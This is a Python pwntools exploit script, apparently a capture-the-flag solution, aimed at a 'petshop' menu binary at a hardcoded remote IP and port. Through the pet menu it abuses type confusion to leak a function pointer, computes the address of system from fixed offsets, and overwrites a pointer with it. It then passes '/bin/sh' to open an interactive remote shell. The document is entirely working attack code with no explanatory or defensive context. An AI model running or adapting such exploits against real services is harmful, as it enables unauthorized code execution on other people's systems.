from pwn import *

r = remote('125.235.240.168', 26000)
#r = process('./petshop')
raw_input('?')

def Buy(name):
        r.recvuntil('Your choice: ')
        r.sendline('1')
        r.recvuntil('Fish\n')
        r.sendline('2')
        r.recvuntil('White\n')
        r.sendline('1')
        r.recvuntil('Enter pet name:')
        r.sendline(name)

def Feed(index, cups):
        r.recvuntil('Your choice: ')
        r.sendline('2')
        r.recvuntil('Enter pet number:')
        r.sendline(str(index))
        r.recvuntil('How many cups of food? ')
        r.sendline(str(cups))

def Play(index):
        r.recvuntil('Your choice: ')
        r.sendline('5')
        r.recvuntil('Enter pet number:')
        r.sendline(str(index))

Buy("Long")
Feed(1, 0x100) #Fish
Play(1)
r.recvuntil("Train your fish?(Y/N) ")
r.sendline('Y')
Feed(1, 0xfe00) #Dog
# system = 0x0ED8
# active = 0x159D
Play(1)
r.recvuntil('Change color?(Y/N) ')
r.sendline('Y')
r.recvuntil('New color: ')
r.sendline('a'*6)
#show
r.recvuntil('Your choice: ')
r.sendline('4')
r.recvuntil('a'*6)
func = u64(r.recv(6)+"\x00\x00")
system = func-0x159D+0x0ED8
log.info("func: %#x" %func)
log.info("system: %#x" %system)
Play(1)
r.recvuntil('Change color?(Y/N) ')
r.sendline('Y')
r.recvuntil('New color: ')
r.sendline('a'*6+p64(system))
Feed(1, 0x200) #Fish
Play(1)
r.recvuntil("Train your fish?(Y/N) ")
r.sendline('N')
r.recvuntil("Enter area:")
r.sendline("/bin/sh\x00")
r.interactive()